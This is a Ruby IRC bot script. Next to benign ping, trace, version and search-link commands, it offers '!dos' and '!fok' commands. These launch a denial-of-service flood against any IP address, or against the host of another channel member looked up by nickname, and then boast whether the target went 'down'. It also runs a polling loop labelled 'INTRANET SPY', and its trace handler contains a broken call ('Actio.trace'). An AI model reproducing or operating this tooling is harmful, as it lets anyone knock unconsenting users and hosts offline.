#!/usr/bin/env ruby
#encoding: utf-8

require 'cinch'
require 'uri'
require 'net/ping'
require 'pry'
require 'yaml'

require_relative 'action'
require_relative 'arguments'

VERSION = IO.read('version')

SEARCH_ENGINES = YAML.load_file(Arguments.new(ARGV).config_file)["search_engines"]
SEARCH_ENGINES_VALUES = SEARCH_ENGINES.values.map{|e|"!"+e}.join(', ')
SEARCH_ENGINES_KEYS = SEARCH_ENGINES.keys.map{|e|"!"+e}.join(', ')
SEARCH_ENGINES_HELP = SEARCH_ENGINES.keys.map{|e|"!"+e+" [search]"}.join(', ')
TARGET = /[[:alnum:]_\-\.]+/

def get_msg m
  URI.encode(m.params[1..-1].join(' ').gsub(/\![^ ]+ /, ''))
end

def get_ip m
  m.params[1..-1].join(' ').gsub(/\![^ ]+ /, '').gsub(/[^[:alnum:]\-\_\.]/, '')
end

def help m
  m.reply "!cmds, !help, !version, !code, !dos [ip], !fok [nick], !ping, !ping [ip], !trace [ip], !poke [nick], !troll [msg], !intra, !intra [on/off], #{SEARCH_ENGINES_HELP}"
end

bot = Cinch::Bot.new do
  @argv = Arguments.new ARGV
  configure do |c|
    c.server = @argv.server
    c.channels = @argv.channels
    c.ssl.use = @argv.ssl
    c.port = @argv.port
    c.user = @argv.user
    c.nick = @argv.nick
  end

  on :message, /!troll .+/ do |m|
    # hours = (Time.now.to_i - Time.gm(2015, 04, 27, 9).to_i) / 60 / 60
    s = get_msg m
    url = "http://www.fuck-you-internet.com/delivery.php?text=#{s}"
    m.reply url
  end

  on :message, /\!(#{SEARCH_ENGINES.keys.join('|')}) .+/ do |m|
    msg = get_msg m
    url = SEARCH_ENGINES[m.params[1..-1].join(' ').gsub(/\!([^ ]+) .+/, '\1')]
    url = url.gsub('___MSG___', msg)
    m.reply url
  end

  on :message, "!version" do |m|
    m.reply VERSION
  end

  on :message, "!code" do |m|
    m.reply "https://github.com/pouleta/botpop"
  end

  on :message, "!intra" do |m|
    m.reply Action.intra_state
  end

  INTRA_PING_SLEEP = 30
  on :message, "!intra on" do |m|
    @intra ||= Mutex.new
    if @intra.try_lock
      begin
        m.reply "INTRANET SPY ON"
        @intra_on = true
        sleep 1
        loop do
          break if @intra_on == false
          m.reply Action.intra_state
          sleep INTRA_PING_SLEEP
        end
        @intra.unlock
      rescue
        @intra.unlock
      end
    else
      m.reply "INTRA SPY ALREADY ON"
    end
  end

  on :message, "!intra off" do |m|
    @intra_on = false
    m.reply "INTRA SPY OFF"
  end

  on :message, "!ping" do |m|
    m.reply "#{m.user} pong"
  end

  on :message, /!ping #{TARGET}\Z/ do |m|
    ip = get_ip m
    p = Net::Ping::External.new ip
    str = "failed"
    if p.ping?
      str = "#{(p.duration*100.0).round 2}ms (#{p.host})"
    end
    m.reply "#{ip} ping> #{str}"
  end

  DOS_DURATION = "2s"
  DOS_WAIT = 5
  on :message, /!dos #{TARGET}\Z/ do |m|
    @dos ||= Mutex.new
    if @dos.try_lock
      begin
        ip = get_ip m
        if not Action.ping(ip)
          m.reply "Cannot reach the host '#{ip}'"
          raise "Unreachable host"
        end
        m.reply "Begin attack against #{ip}"
        s = Action.dos(ip, DOS_DURATION).split("\n")[3].to_s
        m.reply (Action.ping(ip) ? "failed :(" : "down !!!") + " " + s
        sleep DOS_WAIT
        @dos.unlock
      rescue
        @dos.unlock
      end
    else
      m.reply "Wait for the end of the last dos"
    end
  end

  on :message, /!fok #{TARGET}\Z/ do |m|
    nick = get_ip m
    ip = m.target.users.keys.find{|u| u.nick == nick rescue nil}.host rescue nil
    return m.reply "User '#{nick}' doesn't exists" if ip.nil?
    return m.reply "Cannot reach the host '#{ip}'" if not Action.ping(ip)
    s = Action.dos(ip, DOS_DURATION).split("\n")[3].to_s
    m.reply "#{nick} : " + (Action.ping(ip) ? "failed :(" : "down !!!") + " " + s
  end

  on :message, /!trace #{TARGET}\Z/ do |m|
    @trace ||= Mutex.new
    if @trace.try_lock
      begin
        ip = get_ip m
        m.reply "It can take time"
        t1 = Time.now; s = Actio.trace; t2 = Time.now
        m.reply "Used #{(t2 - t1).round(3)} seconds"
        so = s.select{|e| not e.include? "no reply" and e =~ /\A \d+: .+/}
        @trace.unlock
        duration = 0.3
        so.each{|l| m.reply l; sleep duration; duration += 0.1}
        m.reply "Trace #{ip} done"
      rescue # in error case
        @trace.unlock
      end
    else
      m.reply "Please retry after when the last trace end"
    end
  end

  on :message, /!poke #{TARGET}\Z/ do |m|
    nick = get_ip m
    ip = m.target.users.keys.find{|u| u.nick == nick rescue nil}.host rescue nil
    return m.reply "User '#{nick}' doesn't exists" if ip.nil?
    p = Net::Ping::External.new ip
    str = "failed"
    if p.ping?
      str = "#{(p.duration*100.0).round 2}ms (#{p.host})"
    end
    m.reply "#{nick} poke> #{str}"
  end

  on :message, "!cmds" do |m|
    help m
  end

  on :message, "!help" do |m|
    help m
  end

end

bot.start
